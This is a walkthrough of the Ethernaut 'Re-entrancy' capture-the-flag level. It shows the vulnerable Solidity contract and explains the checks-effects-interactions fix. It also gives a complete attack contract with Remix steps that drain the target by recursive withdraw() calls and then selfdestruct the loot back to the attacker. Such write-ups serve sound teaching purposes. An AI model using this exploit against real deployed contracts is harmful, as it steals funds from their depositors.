# 10 Re-entrancy

```
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.
See the Help page above, section "Beyond the console"
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

```

#### Start 


### (1) ` steal all the funds from the contract `
First of all, we need to know Re-entrancy 

#### Re-entrancy 

Re-entrancy  attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.


When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract’s funds

#### How to prevent

Pattern for protecting smart contracts from re-entrancy attacks


 `[CHECKS - EFFECTS(chaining state) - INTERACTIONS]`
####  Example code protecting smart contracts from re-entrancy attacks
```
contract Reentrancy  {  
    mapping(address  => uint256) balance;

    function withdraw() public {
        require(balance[msg.sender] > 0); // CHECKS
        uint256 toTransfer = balance[msg.sender];
        balance[msg.sender] = 0; // EFFECTS (chaining state)
        (bool success,) = msg.sender.call{value: toTransfer}("");  // INTERACTIONS 
        if(!success){
            balance[msg.sender] = toTransfer;
        }
    }

}
```

Now let's look at the code that ethernaut gave us



When we look at the code, we can see that the `withdraw(uint _amount) public`  function is a target we have to attack because it is used to withdraw money



As we know, if a contract external call to another untrusted contract without writing a pattern 

`[CHECKS - EFFECTS(chaining state) - INTERACTIONS] `

it can do a recursive call back to withdraw again and again steal all the funds from the contract

How do we do 

.


.

.




#### This is the code I used to attack contract Reentrance  
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
	function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}


contract atkReentrance {

   Reentrance public target ;
   uint256 public amount ;
  constructor(address _addressReentrance) {
     target = Reentrance(_addressReentrance);
   }
   

    function callDonate() public payable
    {
      target.donate{value: msg.value}(address(this));
      amount = msg.value;
    }

    function callWithdraw() public
    { 
      target.withdraw(amount);
    }

    function sendFundBack() public
    {
      selfdestruct(payable(msg.sender));
    }

     receive() external payable {
        if (address(target).balance != 0 ) {
        target.withdraw(amount); 
            }
    }
}
```
- `function callDonate() public payable`

    This function used to call fucntion `donate()` in contract Reentrance

- `function callWithdraw() public `

    This function used to call fucntion `withdraw()` in contract Reentrance

- `function sendFundBack() public`

    This function used to when an attacker steals all the funds from contract Reentrance then `selfdestruct()` and sends the money back

- `receive() external payable`

    This function will recursive callback to function `withdraw()` again and again until fund in contract = 0


Use the remix deploy contract `atkReentrance`

 - (1) Before we can call the function `withdraw()` , we need to pass a condition. 
 
   `if(balances[msg.sender] >= _amount)`  So we must call the function ` function callDonate() public payable `
   
    and send some ether.

 - (2) then we call the function `function callWithdraw() public` to initiate the re-entrancy attack

 - (3) When first Withdraw is started, the section code `(bool result,) = msg.sender.call{value:_amount}("");` 
 
    will send money to our contract and will trigger fucntion `receive() external payable` in our contact 
    
    and will loop call fucntion `withdraw()` until funds in contract is 0 to stop

    #### ***You may need to increase the gas limit if the transaction fails.

-  (4) call the `function sendFundBack() public` Return all stolen money to us
  


Click button Submit instance and confirm transaction

# !!! we passed !!!


